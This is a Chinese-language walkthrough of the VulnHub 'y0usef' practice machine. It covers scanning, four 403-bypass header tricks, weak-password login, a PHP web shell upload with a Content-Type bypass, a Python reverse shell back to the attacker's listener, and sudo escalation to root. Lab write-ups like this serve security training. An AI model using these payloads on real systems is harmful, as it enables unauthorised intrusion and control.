>**靶机地址：**https://download.vulnhub.com/y0usef/y0usef.ova
>
>**难度等级：**低
>
>**打靶目标：**取得 root 权限 + 2 Flag

## 一、信息收集

### 主机发现

```
sudo arp-scan -l
```

![image-20220216093012124](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093012124.png)

### 端口扫描

```
sudo nmap -p- 192.168.137.233
```

![image-20220216093201459](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093201459.png)

### 服务探测

```
sudo nmap -p22,80-sV -sC 192.168.137.233
```

![image-20220216093937980](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093937980.png)

## 二、漏洞发现

### 访问80端口

![image-20220216094324955](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094324955.png)

页面提示该网站正在建设中，但它已经在运行

#### 查看源代码

![image-20220216094548943](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094548943.png)

也并未发现有帮助的信息

#### whatweb网站指纹识别

```
whatweb http://192.168.137.233
```

![image-20220216094848943](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094848943.png)

#### dirsearch目录扫描

```
dirsearch -u http://192.168.137.233
```

![image-20220216095152430](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095152430.png)

结果显示了大量403响应码，也就意味着目标服务器上存在这些目录/文件，但是因权限不足不能访问。

>403错误是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致，比如IIS或者apache设置了访问权限不当。

访问http://192.168.137.233/adminstration/

![image-20220216095610319](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095610319.png)

可能网站的管理者对权限进行了一些限制管理，那接下来该如何解决403呢？

#### 403Bypass

抓取页面请求的包发送到Burp内的Repeater

![image-20220216100952570](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216100952570.png)

##### 常见的4种403Bypass

###### 使用旁站绕过403

>例：
>
>如下是一个正常的请求响应403过程
>
>#Request
>
>  GET /auth/login HTTP/1.1
>
>  Host:www.abc.com                   **#请求头**
>
>#Response
>
>  HTTP/1.1 403 Forbidden
>
>针对旁站进行修改
>
>#Request
>
>  GET /auth/login HTTP/1.1
>
>  Host: $**xxx**$.abc.com                    **#替换主机名**
>
>#Response
>
>  HTTP/1.1 200 OK
>
>
>
>说明：如果服务器在进行ACL访问控制时，对访问`http://IP/auth/login`是验证**请求头Host**，那么尝试修改其**请求头Host的头部**，服务器会认为是**企业内部的另外一台机器**对`http://IP/auth/login`的正常访问，则可能利用此验证机制绕过403限制。

###### 使用覆盖URL的方式绕过403

>例：
>
>如下是一个正常的请求响应403过程
>
>#Request
>
>  GET /auth/login HTTP/1.1                 **#请求行**
>
>#Response
>
>  HTTP/1.1 403 Forbidden
>
>覆盖URL
>
>#Request
>
>  GET / HTTP/1.1
>
>  X-Original-URL: /auth/login               **#覆盖URL**
>
>#Response
>
>  HTTP/1.1 200 OK
>
>
>
>说明：如果服务器在进行ACL访问控制时，对访问`http://IP/auth/login`是验证请求行URL，那么尝试**添加非标准的HTTP头**（例如X-Original-URL、X-Rewrite-URL），**来覆盖/重写原始请求行中的URL**，尝试使用该方法绕过403权限限制检查。

###### 利用Referer头部绕过403

>例：
>
>如下是一个正常的请求响应403过程
>
>#Request
>
>  GET /auth/login HTTP/1.1            
>
>#Response
>
>  HTTP/1.1 403 Forbidden
>
>覆盖URL
>
>#Request
>
>  GET / HTTP/1.1
>
>  Referer: https://IP/auth/login      **#来源页面**
>
>#Response
>
>  HTTP/1.1 200 OK
>
>补充：也可以使用**Referer头部**（Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。如`http://IP/login.php`，即代表用户从login.php来到当前页面），如果**Referer头部**内的URL是一个**需要较高权限才可访问的URL**，若服务器会根据**Referer头部**来判断的话，则会认为**是已经验证过的权限用户**，可直接访问当前要访问的页面，可借此绕过403.

###### 利用反向代理绕过403

>例：
>
>如下是一个正常的请求响应403过程
>
>#Request
>
>  GET /auth/login HTTP/1.1
>
>  Host: 192.168.137.233                 
>
>#Response
>
>  HTTP/1.1 403 Forbidden
>
>针对旁站进行修改
>
>#Request
>
>  GET /auth/login HTTP/1.1
>
>  Host: 192.168.137.233   
>
>  X-Originating-IP: 127.0.0.1           **#代理本地**
>
>#Response
>
>  HTTP/1.1 200 OK
>
>说明：如果服务器在进行ACL访问控制时，那么尝试**添加非标准的HTTP头**（例如X-Originating-IP、X-Remote-IP、X-Forwarded-For），**来使服务器认为请求来自服务器本地**，尝试使用该方法绕过403权限限制检查。

经过对以上4种方法的逐一尝试，最终**利用反向代理绕过403**

##### 反向代理403Bypass

![image-20220216112556365](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112556365.png)

将其放入Intrueder中Forward包

![image-20220216112723612](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112723612.png)

页面跳转至登陆表单

![image-20220216112808474](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112808474.png)

#### 文件上传

经过尝试发现该表单账号密码都为弱口令admin

尝试提交用户名密码并进行抓包（须在每一次请求时添加X-Forwarded-For绕过403）

![image-20220216113139211](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113139211.png)

进入了后台页面，发现好像有上传页面

![image-20220216113517608](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113517608.png)

![image-20220216113658637](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113658637.png)

写一句话木马a.php

```
<?php $var=shell_exec($_GET['cmd']); echo $var ?>
```

![image-20220216114951617](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216114951617.png)

初次上传发现服务端有对上传文件的校验

![image-20220216115137076](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115137076.png)

经过尝试修改Content-Type即可绕过上传成功

![image-20220216115304086](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115304086.png)

访问a.php（上传后修改了名字）

`http://192.168.137.233/adminstration/upload/files/1644983531a.php`

记得添加X-Forwarded-For绕过403

![image-20220216115527530](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115527530.png)

页面访问成功为空

![image-20220216115622776](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115622776.png)

尝试执行命令

查看当前用户

![image-20220216115804186](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115804186.png)

为普通权限用户

## 三、提权

### 查看目标服务器上是否有python

![image-20220216120212970](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216120212970.png)

### 反弹shell

构造payload

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

kali开启侦听

```
nc -nvlp 4444
```

![image-20220216143055578](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143055578.png)

![image-20220216142807426](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216142807426.png)

成功反弹shell

![image-20220216143312167](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143312167.png)

查看/etc/passwd文件

![image-20220216143455257](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143455257.png)

查看/home目录

![image-20220216143717439](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143717439.png)

拿到第一个flag

```
c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=
```

### SSH登陆

尝试base64解码

![image-20220216143832430](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143832430.png)

```
ssh : 
user : yousef 
pass : yousef123
```

解码完成后信息显示是ssh的账号密码（之前端口扫描确实存在22端口的ssh）

尝试连接

![image-20220216144327107](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144327107.png)

### 利用sudo提权

用户yousef有sudo权限

```
sudo -l
```

发现可以sudo执行所有命令

```
sudo -s
```

![image-20220216144942569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144942569.png)

(这里提权太简单了..)

![image-20220216145157998](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145157998.png)

![image-20220216145226424](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145226424.png)